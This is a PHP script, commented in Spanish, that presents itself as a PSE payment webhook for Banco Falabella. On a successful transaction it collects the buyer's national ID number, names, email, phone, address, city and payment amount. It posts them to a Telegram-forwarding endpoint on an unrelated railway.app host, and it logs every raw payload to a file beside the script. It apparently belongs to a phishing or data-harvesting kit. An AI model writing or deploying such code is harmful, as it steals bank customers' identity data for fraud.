<?php
// pse_webhook.php - Maneja webhooks de PSE para el banco falabella
$config = require __DIR__ . '/../config.php';

// Log de la recepción del webhook
$log_file = __DIR__ . '/pse_webhook.log';
$payload = file_get_contents('php://input');
file_put_contents($log_file, date('Y-m-d H:i:s') . " - PSE Webhook: " . $payload . "\n", FILE_APPEND);

// Decodificar el payload de PSE (asumiendo JSON)
$data = json_decode($payload, true);

if (!$data) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid JSON payload']);
    exit;
}

// Verificar si es una transacción exitosa o actualización
if (isset($data['transaction_state']) && $data['transaction_state'] === 'OK') {
    // Transacción exitosa, enviar datos a Telegram

    // Preparar datos para send_telegram.php
    $telegram_data = [
        'tipo_doc' => $data['buyer']['documentType'] ?? 'CC',
        'cedula' => $data['buyer']['document'] ?? '',
        'nombres' => $data['buyer']['name'] ?? '',
        'apellidos' => $data['buyer']['surname'] ?? '',
        'correo' => $data['buyer']['email'] ?? '',
        'telefono' => $data['buyer']['mobile'] ?? '',
        'celular' => $data['buyer']['mobile'] ?? '',
        'direccion' => $data['buyer']['address'] ?? '',
        'pais' => 'Colombia',
        'ciudad' => $data['buyer']['city'] ?? '',
        'tipo_persona' => 'natural',
        'monto' => $data['amount'] ?? '',
        'banco' => 'falabella'
    ];

    // Llamar a send_telegram.php
    $ch = curl_init('https://facturelinexpress-production-26cd.up.railway.app/data-ps/recargas/send_telegram.php');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($telegram_data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    file_put_contents($log_file, date('Y-m-d H:i:s') . " - Telegram response: {$response} (HTTP {$http_code})\n", FILE_APPEND);
}

// Responder OK a PSE
http_response_code(200);
echo json_encode(['status' => 'received']);
?>